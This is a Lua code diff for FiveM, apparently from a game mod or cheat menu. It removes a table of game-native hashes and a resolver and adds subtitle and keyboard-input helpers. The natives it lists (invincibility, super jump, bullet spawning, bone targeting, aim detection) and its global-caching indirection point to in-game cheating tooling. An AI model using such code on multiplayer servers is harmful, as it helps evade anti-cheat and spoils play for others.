-            unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
-        },
-        ["IsDisabledControlJustPressed"] = {
-            hash = 0x91AEF906BCA88877,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsDisabledControlJustReleased"] = {
-            hash = 0x305C8DCD79DA8B0F,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsDisabledControlPressed"] = {
-            hash = 0xE2587F8CBBD87B1D,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsDisabledControlReleased"] = {
-            hash = 0xFB6C4072E9A32E92,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsControlJustPressed"] = {
-            hash = 0x580417101DDB492F,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsControlJustReleased"] = {
-            hash = 0x50F940259D3841E6,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsControlPressed"] = {
-            hash = 0xF3A21BCD95725A4A,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsControlReleased"] = {
-            hash = 0x648EE3E7F38877DD,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["ClearPedTasks"] = {
-            hash = 0xE1EF3C1216AFF2CD
-        },
-        ["ClearPedTasksImmediately"] = {
-            hash = 0xAAA34F8A7CB32098
-        },
-        ["ClearPedSecondaryTask"] = {
-            hash = 0x176CECF6F920D707
-        },
-        ["SetEntityProofs"] = {
-            hash = 0xFAEE099C6F890BB8
-        },
-        ["SetCamActive"] = {
-            hash = 0x026FB97D0A425F84
-        },
-        ["RenderScriptCams"] = {
-            hash = 0x07E5B515DB0636FC,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], args[4], args[5]
-            end
-        },
-        ["GetEntityForwardVector"] = {
-            hash = 0x0A794A5A57F8DF91,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["RequestAnimDict"] = {
-            hash = 0xD3BD40951412FEF6
-        },
-        ["SetTextScale"] = {
-            hash = 0x07C837F9A01C34C9
-        },
-        ["SetTextColour"] = {
-            hash = 0xBE6B23FFA53FB442
-        },
-        ["SetTextDropShadow"] = {
-            hash = 0x465C84BC39F1C351
-        },
-        ["SetTextEdge"] = {
-            hash = 0x441603240D202FA6
-        },
-        ["SetTextOutline"] = {
-            hash = 0x2513DFB0FB8400FE
-        },
-        ["ClearPedBloodDamage"] = {
-            hash = 0x8FE22675A5A45817
-        },
-        ["SetEntityHealth"] = {
-            hash = 0x6B76DC1F3AE6E6A3
-        },
-        ["NetworkResurrectLocalPlayer"] = {
-            hash = 0xEA23C49EAA83ACFB
-        },
-        ["SetTextCentre"] = {
-            hash = 0xC02F4DBFB51D988B
-        },
-        ["BeginTextCommandDisplayText"] = {
-            hash = 0x25FBB336DF1804CB
-        },
-        ["BeginTextCommandWidth"] = {
-            hash = 0x54CE8AC98E120CAB
-        },
-        ["EndTextCommandGetWidth"] = {
-            hash = 0x85F061DA64ED2F67,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ResultAsFloat()
-            end
-        },
-        ["GetTextScaleHeight"] = {
-            hash = 0xDB88A37483346780,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ResultAsFloat()
-            end
-        },
-        ["DrawSprite"] = {
-            hash = 0xE7FFAE5EBF23D890
-        },
-        ["FreezeEntityPosition"] = {
-            hash = 0x428CA6DBD1094446
-        },
-        ["GetPedBoneIndex"] = {
-            hash = 0x3F428D08BE5AAE31,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetPedBoneCoords"] = {
-            hash = 0x17C07FC640E86B4E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], args[4], args[5], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["SetPedShootsAtCoord"] = {
-            hash = 0x96A05E4FB321B1BA
-        },
-        ["GetEntityBoneIndexByName"] = {
-            hash = 0xFB71170B7E76ACBA,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.tostring(args[2]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetOffsetFromEntityInWorldCoords"] = {
-            hash = 0x1899F328B0E12848,
-            unpack = function(...)
-                local args = (...)
-                local x, y, z
-
-                if dict.type(args[2]) == "table" or dict.type(args[2]) == "vector" then
-                    x = args[2].x
-                    y = args[2].y
-                    z = args[2].z
-                else
-                    x = args[2]
-                    y = args[3]
-                    z = args[4]
-                end
-
-                return args[1], x, y, z, dict.Citizen.ResultAsVector()
-            end
-        },
-        ["AddTextComponentSubstringPlayerName"] = {
-            hash = 0x6C188BE134E074AA
-        },
-        ["EndTextCommandDisplayText"] = {
-            hash = 0xCD015E5BB0D96A57
-        },
-        ["IsPedInAnyVehicle"] = {
-            hash = 0x997ABD671D25CA0B
-        },
-        ["GetEntityHeading"] = {
-            hash = 0xE83D4F9BA2A38914,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
-            end
-        },
-        ["AddBlipForCoord"] = {
-            hash = 0x5A039BB0BCA604B6
-        },
-        ["SetBlipSprite"] = {
-            hash = 0xDF735600A4696DAF
-        },
-        ["SetBlipColour"] = {
-            hash = 0x03D7FB09E75D6B7E
-        },
-        ["SetBlipScale"] = {
-            hash = 0xD38744167B2FA257
-        },
-        ["SetBlipCoords"] = {
-            hash = 0xAE2AF67E9D9AF65D
-        },
-        ["SetBlipRotation"] = {
-            hash = 0xF87683CDF73C3F6E
-        },
-        ["ShowHeadingIndicatorOnBlip"] = {
-            hash = 0x5FBCA48327B914DF
-        },
-        ["SetBlipCategory"] = {
-            hash = 0x234CDD44D996FD9A
-        },
-        ["BeginTextCommandSetBlipName"] = {
-            hash = 0xF9113A30DE5C6670
-        },
-        ["GetPlayerName"] = {
-            hash = 0x6D0DE6A7B5DA71F8,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ResultAsString()
-            end
-        },
-        ["EndTextCommandSetBlipName"] = {
-            hash = 0xBC38B49BCB83BC9B
-        },
-        ["DrawRect"] = {
-            hash = 0x3A618A217E5154F0
-        },
-        ["IsEntityInAir"] = {
-            hash = 0x886E37EC497200B6
-        },
-        ["DisableAllControlActions"] = {
-            hash = 0x5F4B6931816E599B
-        },
-        ["TaskWanderStandard"] = {
-            hash = 0xBB9CE077274F6A1B
-        },
-        ["TaskWarpPedIntoVehicle"] = {
-            hash = 0x9A7D091411C5F684
-        },
-        ["SetMouseCursorActiveThisFrame"] = {
-            hash = 0xAAE7CE1D63167423
-        },
-        ["SetMouseCursorSprite"] = {
-            hash = 0x8DB8CFFD58B62552
-        },
-        ["GiveDelayedWeaponToPed"] = {
-            hash = 0xB282DC6EBD803C75
-        },
-        ["ApplyForceToEntity"] = {
-            hash = 0xC5F68BE9613E2D18
-        },
-        ["GetScreenCoordFromWorldCoord"] = {
-            hash = 0x34E82F05DF2974F5,
-            unpack = function(...)
-                local args = (...)
-                local x, y, z
-
-                if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
-                    x = args[1].x
-                    y = args[1].y
-                    z = args[1].z
-                else
-                    x = args[1]
-                    y = args[2]
-                    z = args[3]
-                end
-
-                return x, y, z, dict.Citizen.PointerValueFloat(), dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["NetworkIsPlayerTalking"] = {
-            hash = 0x031E11F3D447647E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["SetDrawOrigin"] = {
-            hash = 0xAA0008F3BBB8F416
-        },
-        ["ClearDrawOrigin"] = {
-            hash = 0xFF0B610F6BE0D7AF
-        },
-        ["GetRenderingCam"] = {
-            hash = 0x5234F9F10919EABA,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
-        },
-        ["GetGameplayCamCoord"] = {
-            hash = 0x14D6F5678D8F1B37,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
-        },
-        ["GetFinalRenderedCamCoord"] = {
-            hash = 0xA200EB1EE790F448,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector() end
-        },
-        ["GetGameplayCamFov"] = {
-            hash = 0x65019750A0324133,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat() end
-        },
-        ["ObjToNet"] = {
-            hash = 0x99BFDC94A603E541,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["StatSetInt"] = {
-            hash = 0xB3271D7AB655B441,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["NetworkSetNetworkIdDynamic"] = {
-            hash = 0x2B1813ABA29016C5
-        },
-        ["SetNetworkIdExistsOnAllMachines"] = {
-            hash = 0xE05E81A888FA63C8
-        },
-        ["GetDistanceBetweenCoords"] = {
-            hash = 0xF1B760881820C952,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
-            end
-        },
-        ["SetEntityHeading"] = {
-            hash = 0x8E2530AA8ADA980E
-        },
-        ["HasScaleformMovieLoaded"] = {
-            hash = 0x85F01B8D5B90570E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["RequestScaleformMovie"] = {
-            hash = 0x11FE353CF9733E6F,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["BeginScaleformMovieMethod"] = {
-            hash = 0xF6E48914C7A8694E
-        },
-        ["EndScaleformMovieMethodReturnValue"] = {
-            hash = 0xC50AA39A577AF886,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
-        },
-        ["ScaleformMovieMethodAddParamInt"] = {
-            hash = 0xC3D0841A0CC546A6
-        },
-        ["ScaleformMovieMethodAddParamTextureNameString"] = {
-            hash = 0xBA7148484BD90365
-        },
-        ["DisableControlAction"] = {
-            hash = 0xFE99B66D079CF6BC
-        },
-        ["PlayerId"] = {
-            hash = 0x4F8644AF03D0E0D6,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
-        },
-        ["ShootSingleBulletBetweenCoords"] = {
-            hash = 0x867654CBC7606F2C,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.type(args[9]) == "string" and FM:GetFunction("GetHashKey")(args[9]) or args[9], args[10], args[11], args[12], args[13]
-            end
-        },
-        ["ClearAreaOfProjectiles"] = {
-            hash = 0x0A1CB9094635D1A6
-        },
-        ["GetPedLastWeaponImpactCoord"] = {
-            hash = 0x6C4D0409BA1A2BC2,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["SetExplosiveMeleeThisFrame"] = {
-            hash = 0xFF1BED81BFDC0FE0
-        },
-        ["GetCurrentPedWeaponEntityIndex"] = {
-            hash = 0x3B390A939AF0B5FC,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetSelectedPedWeapon"] = {
-            hash = 0x0A6DB4965674D243,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["PedSkipNextReloading"] = {
-            hash = 0x8C0D57EA686FAD87
-        },
-        ["GetMaxAmmoInClip"] = {
-            hash = 0xA38DCFFCEA8962FA,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetAmmoInClip"] = {
-            hash = 0x2E1202248937775C,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsPlayerFreeAiming"] = {
-            hash = 0x2E397FD2ECD37C87,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsPedDoingDriveby"] = {
-            hash = 0xB2C086CC1BF8F2BF,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["GetEntityPlayerIsFreeAimingAt"] = {
-            hash = 0x2975C866E6713290,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsPlayerFreeAimingAtEntity"] = {
-            hash = 0x3C06B5C839B38F7B,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["DisablePlayerFiring"] = {
-            hash = 0x5E6CC07646BBEAB8
-        },
-        ["SetFocusPosAndVel"] = {
-            hash = 0xBB7454BAFF08FE25
-        },
-        ["SetCamCoord"] = {
-            hash = 0x4D41783FB745E42E
-        },
-        ["SetCamActive"] = {
-            hash = 0x026FB97D0A425F84
-        },
-        ["SetCamFov"] = {
-            hash = 0xB13C14F66A00D047
-        },
-        ["SetCamRot"] = {
-            hash = 0x85973643155D0B07
-        },
-        ["SetCamShakeAmplitude"] = {
-            hash = 0xD93DB43B82BC0D00
-        },
-        ["UpdateOnscreenKeyboard"] = {
-            hash = 0x0CF2B696BBF945AE,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
-        },
-        ["CancelOnscreenKeyboard"] = {
-            hash = 0x58A39BE597CE99CD
-        },
-        ["SetVehicleFixed"] = {
-            hash = 0x115722B1B9C14C1C
-        },
-        ["SetVehicleDirtLevel"] = {
-            hash = 0x79D3B596FE44EE8B
-        },
-        ["SetVehicleLights"] = {
-            hash = 0x34E710FF01247C5A
-        },
-        ["SetVehicleBurnout"] = {
-            hash = 0xFB8794444A7D60FB
-        },
-        ["SetVehicleLightsMode"] = {
-            hash = 0x1FD09E7390A74D54
-        },
-        ["GetCamMatrix"] = {
-            hash = 0x8f57a89d,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
-            end
-        },
-        ["DoesEntityHaveDrawable"] = {
-            hash = 0x060D6E96F8B8E48D,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsEntityAnObject"] = {
-            hash = 0x8D68C8FD0FACA94E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsEntityAVehicle"] = {
-            hash = 0x6AC7003FA6E5575E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["SetNewWaypoint"] = {
-            hash = 0xFE43368D2AA4F2FC
-        },
-        ["HasEntityClearLosToEntityInFront"] = {
-            hash = 0x0267D00AF114F17A,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["HasEntityClearLosToEntity"] = {
-            hash = 0xFCDFF7B72D23A1AC,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsEntityAPed"] = {
-            hash = 0x524AC5ECEA15343E,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["GetControlInstructionalButton"] = {
-            hash = 0x0499D7B09FC9B407,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
-            end
-        },
-        ["DrawScaleformMovie"] = {
-            hash = 0x54972ADAF0294A93
-        },
-        ["SetFocusEntity"] = {
-            hash = 0x198F77705FA0931D
-        },
-        ["DrawLine"] = {
-            hash = 0x6B7256074AE34680
-        },
-        ["DrawPoly"] = {
-            hash = 0xAC26716048436851
-        },
-        ["GetEntityRotation"] = {
-            hash = 0xAFBD61CC738D9EB9,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
-            end
-        },
-        ["TaskPlayAnim"] = {
-            hash = 0xEA47FE3719165B94
-        },
-        ["TaskVehicleTempAction"] = {
-            hash = 0xC429DCEEB339E129
-        },
-        ["AttachEntityToEntity"] = {
-            hash = 0x6B9BBD38AB0796DF
-        },
-        ["SetRunSprintMultiplierForPlayer"] = {
-            hash = 0x6DB47AA77FD94E09
-        },
-        ["SetSuperJumpThisFrame"] = {
-            hash = 0x57FFF03E423A4C0B
-        },
-        ["SetPedMoveRateOverride"] = {
-            hash = 0x085BF80FA50A39D1
-        },
-        ["DisplayOnscreenKeyboard"] = {
-            hash = 0x00DC833F2568DBF6
-        },
-        ["GetOnscreenKeyboardResult"] = {
-            hash = 0x8362B09B91893647,
-            unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString() end
-        },
-        ["SetEntityVisible"] = {
-            hash = 0xEA1C610A04DB6BBB
-        },
-        ["SetEntityInvincible"] = {
-            hash = 0x3882114BDE571AD4
-        },
-        ["TaskSetBlockingOfNonTemporaryEvents"] = {
-            hash = 0x90D2156198831D69
-        },
-        ["GiveWeaponToPed"] = {
-            hash = 0xBF0FD6E56C964FCB
-        },
-        ["SetPedAccuracy"] = {
-            hash = 0x7AEFB85C1D49DEB6
-        },
-        ["SetPedAlertness"] = {
-            hash = 0xDBA71115ED9941A6
-        },
-        ["TaskCombatPed"] = {
-            hash = 0xF166E48407BAC484
-        },
-        ["SetPlayerModel"] = {
-            hash = 0x00A1CADD00108836,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2]
-            end
-        },
-        ["GetDisplayNameFromVehicleModel"] = {
-            hash = 0xB215AAC32D25D019,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
-            end
-        },
-        ["SetPedRandomComponentVariation"] = {
-            hash = 0xC8A9481A01E63C28
-        },
-        ["SetPedRandomProps"] = {
-            hash = 0xC44AA05345C992C6
-        },
-        ["SetVehicleEngineOn"] = {
-            hash = 0x2497C4717C8B881E
-        },
-        ["SetVehicleForwardSpeed"] = {
-            hash = 0xAB54A438726D25D5
-        },
-        ["SetVehicleCurrentRpm"] = {
-            hash = 0x2A01A8FC
-        },
-        ["IsModelValid"] = {
-            hash = 0xC0296A2EDF545E92,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsModelAVehicle"] = {
-            hash = 0x19AAC8F07BFEC53E,
-            unpack = function(...)
-                local args = (...)
-
-                return dict.type(args[1]) == "string" and FM:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["IsPedWeaponReadyToShoot"] = {
-            hash = 0xB80CA294F2F26749,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["SetPedComponentVariation"] = {
-            hash = 0x262B14F48D29DE80
-        },
-        ["GetEntityHealth"] = {
-            hash = 0xEEF059FAD016D209,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetAmmoInPedWeapon"] = {
-            hash = 0x015A522136D7F951,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetMaxAmmo"] = {
-            hash = 0xDC16122C7A20C933,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], dict.Citizen.PointerValueIntInitialized(args[3]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetAmmoInPedWeapon"] = {
-            hash = 0x015A522136D7F951,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetPedPropIndex"] = {
-            hash = 0x898CC20EA75BACD8,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetPedPropTextureIndex"] = {
-            hash = 0xE131A28626F81AB2,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetPedDrawableVariation"] = {
-            hash = 0x67F3780DD425D4FC,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetPedTextureVariation"] = {
-            hash = 0x04A355E041E004E6,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["GetPedPaletteVariation"] = {
-            hash = 0xE3DD5F2A84B42281,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
-            end
-        },
-        ["SetPedPropIndex"] = {
-            hash = 0x93376B65A266EB5F
-        },
-        ["SetPedAmmo"] = {
-            hash = 0x14E56BC5B5DB6A19
-        },
-        ["SetAmmoInClip"] = {
-            hash = 0xDCD2A934D65CB497,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], dict.type(args[2]) == "string" and FM:GetFunction("GetHashKey")(args[2]) or args[2], args[3], dict.Citizen.ReturnResultAnyway()
-            end
-        },
-        ["GetDisabledControlNormal"] = {
-            hash = 0x11E65974A982637C,
-            unpack = function(...)
-                local args = (...)
-
-                return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
-            end
-        },
-        ["TaskLookAtEntity"] = {
-            hash = 0x69F4BE8C8CC4796C
-        },
-        ["PointCamAtEntity"] = {
-            hash = 0x5640BFF86B16E8DC
-        }
-    }
-
-    local _bad = {}
-    local _empty = function() end
-
-    local bad = function(...)
-        if not _bad[dict.tostring(...)] then
-            FM:Print("[NATIVE] Invalid GetFunction call: ^1" .. dict.tostring(...) .. "^7")
-            _bad[dict.tostring(...)] = true
+    FiveM.Subtitle = function(message, duration, drawImmediately)
+        if duration == nil then duration = 2500 end;
+        if drawImmediately == nil then drawImmediately = true; end;
+        ClearPrints()
+        SetTextEntry_2("STRING");
+        for i = 1, message:len(), 99 do
+            AddTextComponentString(string.sub(message, i, i + 99))
         end
-
-        return _empty
+        DrawSubtitleTimed(duration, drawImmediately);
     end
 
-    function FM:GetFunction(name)
-        if not _natives[name] then return bad(name) end
+    FiveM.GetKeyboardInput = function(TextEntry, ExampleText, MaxStringLength)
+        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
+        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
+        local blockinput = true
+        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do Citizen.Wait(0) end
 
-        if _natives[name].func then
-            return _natives[name].func
-        elseif _natives[name].hash then
-            _natives[name].func = function(...)
-                local args = {...}
-                local data = _natives[name]
-                local hash = data.hash
-
-                if data.unpack then
-                    if data.return_as then return data.return_as(dict.Citizen.IN(hash, data.unpack(args))) end
-
-                    return dict.Citizen.IN(hash, data.unpack(args))
-                else
-                    if data.return_as then return data.return_as(dict.Citizen.IN(hash, table.unpack(args))) end
-
-                    return dict.Citizen.IN(hash, table.unpack(args))
-                end
-            end
-
-            return _natives[name].func
-        end
-    end
-
-    FM.Keys = {
-        ["ESC"] = 322,
-        ["F1"] = 288,
-        ["F2"] = 289,
-        ["F3"] = 170,
-        ["F5"] = 166,
-        ["F6"] = 167,
-        ["F7"] = 168,
-        ["F8"] = 169,
-        ["F9"] = 56,
-        ["F10"] = 57,
-        ["~"] = 243,
-        ["1"] = 157,
-        ["2"] = 158,
-        ["3"] = 160,
-        ["4"] = 164,
-        ["5"] = 165,
-        ["6"] = 159,
-        ["7"] = 161,
-        ["8"] = 162,
-        ["9"] = 163,
-        ["-"] = 84,
-        ["="] = 83,
-        ["BACKSPACE"] = 177,
-        ["TAB"] = 37,
-        ["Q"] = 44,
-        ["W"] = 32,
-        ["E"] = 38,
-        ["R"] = 45,
-        ["T"] = 245,
-        ["Y"] = 246,
-        ["U"] = 303,
-        ["P"] = 199,
-        ["["] = 39,
-        ["]"] = 40,
-        ["ENTER"] = 18,
-        ["CAPS"] = 137,
-        ["A"] = 34,
-        ["S"] = 8,
-        ["D"] = 9,
-        ["F"] = 23,
-        ["G"] = 47,
-        ["H"] = 74,
-        ["K"] = 311,
-        ["L"] = 182,
-        ["LEFTSHIFT"] = 21,
-        ["Z"] = 20,
-        ["X"] = 73,
-        ["C"] = 26,
-        ["V"] = 0,
-        ["B"] = 29,
-        ["N"] = 249,
-        ["M"] = 244,
-        [","] = 82,
-        ["."] = 81,
-        ["LEFTCTRL"] = 36,
-        ["LEFTALT"] = 19,
-        ["SPACE"] = 22,
-        ["RIGHTCTRL"] = 70,
-        ["HOME"] = 213,
-        ["PAGEUP"] = 10,
-        ["PAGEDOWN"] = 11,
-        ["DELETE"] = 178,
-        ["LEFT"] = 174,
-        ["RIGHT"] = 175,
-        ["UP"] = 172,
-        ["DOWN"] = 173,
-        ["NENTER"] = 201,
-        ["MWHEELUP"] = 15,
-        ["MWHEELDOWN"] = 14,
-        ["N4"] = 108,
-        ["N5"] = 60,
-        ["N6"] = 107,
-        ["N+"] = 96,
-        ["N-"] = 97,
-        ["N7"] = 117,
-        ["N8"] = 61,
-        ["N9"] = 118,
-        ["MOUSE1"] = 24,
-        ["MOUSE2"] = 25,
-        ["MOUSE3"] = 348
-    }
-
